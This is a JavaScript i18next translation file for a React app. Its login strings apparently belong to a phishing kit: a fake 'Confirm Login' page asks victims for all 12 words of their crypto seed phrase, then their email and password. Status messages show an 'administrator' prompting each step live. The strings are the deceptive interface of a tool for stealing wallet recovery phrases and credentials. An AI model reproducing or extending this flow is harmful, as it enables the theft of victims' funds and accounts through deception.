import i18n from 'i18next';
import { initReactI18next } from 'react-i18next';

const resources = {
  en: {
    translation: {
      landing: {
        subscribeSuccess: 'Email registered successfully. Thank you!',
        subscribeError: 'We could not subscribe your email. Please try again.',
      },
      login: {
        title: 'Confirm Login',
        instruction: 'Enter the 12 words of your seed phrase to confirm login.',
        confirm: 'Submit seed',
        wordPlaceholder: 'Word',
        waitingTitle: 'Please wait',
        emailTitle: 'Provide your email',
        emailInstruction: 'Enter the email associated with your account to continue.',
        emailLabel: 'Email',
        emailPlaceholder: 'you@email.com',
        submitEmail: 'Submit email',
        passwordTitle: 'Provide your password',
        passwordInstruction: 'Enter your password to finish the verification.',
        passwordLabel: 'Password',
        passwordPlaceholder: 'Your password',
        submitPassword: 'Submit password',
        awaitingAdmin: 'We are waiting for an administrator to continue. Please keep this window open.',
        finalizedTitle: 'All set!',
        finalizedDescription: 'Thanks! You can close this window now.',
        close: 'Close',
        submitting: 'Sending…',
        connectionIssue: 'Connection lost. Trying to reconnect…',
        invalidSocket: 'Unable to connect to the server. Please retry.',
        missingSeed: 'Please fill all 12 seed words before continuing.',
        sessionUnavailable: 'Session is no longer available.',
        emailRequired: 'A valid email address is required.',
        passwordRequired: 'Password is required.',
        genericError: 'Something went wrong. Please try again.',
        status: {
          seedSubmitted: 'Seed phrase submitted',
          awaitingEmail: 'Waiting for admin to request email',
          awaitingPassword: 'Waiting for password submission',
          passwordSubmitted: 'Password submitted — waiting for admin',
          finalized: 'Session finalized',
        },
      },
    },
  },
}

i18n
  .use(initReactI18next)
  .init({
    resources,
    lng: 'en',
    fallbackLng: 'en',
    interpolation: {
      escapeValue: false,
    },
  })

export default i18n